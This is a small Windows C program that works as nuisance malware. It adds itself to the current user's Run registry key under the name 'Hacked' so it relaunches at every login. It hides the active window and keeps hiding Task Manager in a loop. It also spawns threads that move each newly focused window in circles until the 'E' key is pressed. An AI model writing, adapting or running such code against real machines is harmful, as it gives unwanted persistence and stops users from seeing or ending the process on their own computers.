#include <windows.h>
#include <math.h>

void runAtStartup(){
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;
    HKEY NewVal;
    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal);
    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes);
    RegCloseKey(NewVal);
}

void disableTaskMgr(){
    HWND taskmgr;
    taskmgr = FindWindowA(NULL, "Task Manager");
    ShowWindow(taskmgr, 0);
    Sleep(50);    
}

DWORD WINAPI moveit() {
    ShellExecuteA(NULL, "open", "C:\\", NULL, NULL, SW_SHOWDEFAULT);
    HWND a = GetForegroundWindow();
    int i, j, k = 1;
    while (k++) {
        i = 200 + 300 * cos(k);
        j = 150 + 300 * sin(k);
        MoveWindow(a, i, j, i, j, 1);
        Sleep(50);
	if (GetAsyncKeyState('E') & 0x8000) {
                exit(EXIT_SUCCESS);
        }
    }
}

int main() {
    runAtStartup();
    ShellExecuteA(NULL, "open", "C:\\", NULL, NULL, SW_SHOWDEFAULT);
    DWORD dwThreadId;
    HWND last = GetForegroundWindow();
    ShowWindow(last, SW_HIDE);
    while (1) {
	disableTaskMgr();
        if (last != GetForegroundWindow()) {
            last = GetForegroundWindow();
            CreateThread(NULL, 0, moveit, &last, 0, &dwThreadId);
        }
    }
    return 0;
}

